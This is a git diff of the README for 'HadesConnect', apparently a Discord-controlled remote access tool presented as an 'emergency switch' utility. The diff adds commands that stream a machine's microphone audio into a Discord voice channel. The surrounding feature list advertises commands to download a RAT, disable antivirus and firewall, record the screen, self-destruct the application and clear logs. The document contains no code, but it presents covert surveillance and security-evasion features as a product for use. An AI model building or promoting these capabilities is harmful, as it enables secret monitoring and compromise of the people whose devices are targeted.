@@ -30,6 +30,7 @@ HadesConnect is a software solution designed to enable emergency switch activati
 
 - 🐛 Fixed bugs:
   - Fixed issue with Spotify remote device control not starting on device boot.
+  - Fixed issues with voice recording and streaming voice to Discord channel.
 - 🚀 Added new features:
   - 🔥 Deactivate antivirus firewall.
   - 🖼️ Fixed screenshot and screen share.
@@ -38,6 +39,7 @@ HadesConnect is a software solution designed to enable emergency switch activati
   - 🔋 Get battery status: Monitor and display device battery status.
   - 🚨 Self-destruction of application: Implement a feature to self-destruct the application securely.
   - 📜 Clear logs: Provide functionality to clear application logs securely.
+  - 🎤 Streaming Voice: Stream voice from voice channels.
 
 ## Feature List
 
@@ -55,7 +57,11 @@ HadesConnect is a software solution designed to enable emergency switch activati
 - 📡 **/rat_down:** Initiates a remote access tool download.
 - 🔄 **/sys_restart:** Restarts the system.
 - 🗑️ **/clear:** Clears the current operation.
-- 🎤 **/voice_rec [duration]:** Initiates voice recognition. (Duration must be a positive integer.)
+- ### Voice Commands
+- Use `!join` to make the bot join your current voice channel.
+- Use `!voice_start` to start streaming audio from your microphone to the voice channel.
+- Use `!voice_stop` to stop streaming.
+- Use `!leave` to make the bot leave the voice channel.
 - 🖥️ **/recscreen [duration]:** Records the screen. (Invalid duration. Please specify a valid number after '!recscreen')
 - 🛡️ **/disableantivirus:** Disables antivirus protection.
 - 🛡️ **/disablefirewall:** Disables firewall protection.
